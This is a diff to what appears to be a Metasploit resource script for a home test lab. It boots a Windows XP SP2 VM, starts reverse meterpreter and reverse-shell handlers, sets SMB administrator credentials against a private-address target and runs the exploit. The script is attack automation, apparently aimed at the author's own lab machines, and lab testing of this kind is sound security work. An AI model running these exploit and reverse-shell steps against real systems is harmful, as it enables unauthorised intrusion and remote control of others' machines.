@@ -1,6 +1,10 @@
 # rc script to start a rev meterp handler and set autorun my test module
 
 # let's get our vms started first
+load lab
+lab_load_config test_lab.yml
+# and start them
+lab_start winxp_sp2
 
 <ruby>
 	# Let's require in our "awesome" resource helping file
@@ -19,6 +23,8 @@
 	auto_handler("8888") # meterpreter/reverse_tcp handler by default
 	# setup a shell handler too
 	auto_handler("8887", "windows/shell/reverse_tcp")
+	# find a way to get the vm ips
+	$my_vm_ips = ["192.168.170.129"]
 </ruby>
 
 
@@ -32,6 +38,13 @@ set RHOST 192.168.170.128
 set LPORT 8888
 set SMBUser administrator
 set SMBPass	lab
+
+# let's make sure the vm is up
+<ruby>
+	# for now, let's just wait a bit, ghetto
+	print_good "Waiting for vms to come up, if you know they are up hit enter"
+	pause(10,true)
+</ruby>
 exploit -z
 # now the shell payload
 set PAYLOAD windows/shell/reverse_tcp
